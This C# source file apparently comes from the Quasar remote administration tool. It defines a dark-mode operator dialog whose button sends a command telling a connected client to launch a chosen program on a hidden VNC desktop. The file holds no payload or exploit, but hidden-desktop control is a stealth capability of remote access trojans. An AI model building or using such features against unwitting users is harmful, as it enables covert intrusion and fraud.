using Quasar.Common.Messages.Monitoring.HVNC;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Server.Forms.HVNC
{
    public partial class FrmHVNCFileSelection: Form
    {
        private readonly Client _client;
        public FrmHVNCFileSelection(Client c)
        {
            _client = c;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            _client.Send(new StartHVNCProcess
            {
               Application = txtBoxPathAndArgs.Text
            });
        }
    }
}
